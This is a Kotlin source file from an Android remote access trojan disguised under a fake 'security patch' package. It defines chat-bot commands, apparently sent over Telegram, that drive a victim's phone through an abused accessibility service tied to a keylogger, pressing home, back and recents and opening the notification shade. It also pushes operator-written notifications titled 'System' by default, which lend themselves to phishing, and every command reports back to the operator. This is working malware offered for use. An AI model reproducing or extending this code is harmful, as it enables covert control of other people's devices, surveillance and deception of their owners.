package com.android.security.patch.commands

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import androidx.core.app.NotificationCompat
import com.android.security.patch.KeylogService
import com.android.security.patch.RatApi

object Navigate {

    fun home(ctx: Context, chatId: Long) {
        val ok = KeylogService.instance?.goHome() ?: false
        reply(ctx, chatId, if (ok) "home pressed" else "accessibility not active")
    }

    fun back(ctx: Context, chatId: Long) {
        val ok = KeylogService.instance?.goBack() ?: false
        reply(ctx, chatId, if (ok) "back pressed" else "accessibility not active")
    }

    fun recents(ctx: Context, chatId: Long) {
        val ok = KeylogService.instance?.openRecents() ?: false
        reply(ctx, chatId, if (ok) "recents opened" else "accessibility not active")
    }

    fun pullNotifications(ctx: Context, chatId: Long) {
        val ok = KeylogService.instance?.openNotifs() ?: false
        reply(ctx, chatId, if (ok) "notif shade opened" else "accessibility not active")
    }

    /**
     * Kirim notifikasi ke device target.
     * Format: /notif_send <title>|<body>
     * Kalau gak pakai pipe, title = "System", body = semua arg.
     */
    fun sendNotification(ctx: Context, chatId: Long, args: Array<String>) {
        val raw = args.joinToString(" ").trim()
        if (raw.isEmpty()) { reply(ctx, chatId, "usage: /notif_send Title|Body"); return }
        val (title, body) = if (raw.contains("|")) {
            raw.substringBefore("|").trim() to raw.substringAfter("|").trim()
        } else "System" to raw

        try {
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val chId = "inbox_${System.currentTimeMillis()}"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val ch = NotificationChannel(chId, "Messages", NotificationManager.IMPORTANCE_HIGH)
                nm.createNotificationChannel(ch)
            }
            val n = NotificationCompat.Builder(ctx, chId)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(body)
                .setStyle(NotificationCompat.BigTextStyle().bigText(body))
                .setAutoCancel(true)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .build()
            nm.notify((System.currentTimeMillis() % Int.MAX_VALUE).toInt(), n)
            reply(ctx, chatId, "notification sent")
        } catch (e: Throwable) {
            reply(ctx, chatId, "err: ${e.message}")
        }
    }

    private fun reply(ctx: Context, chatId: Long, s: String) {
        RatApi.sendMessage(ctx, s, chatId)
    }
}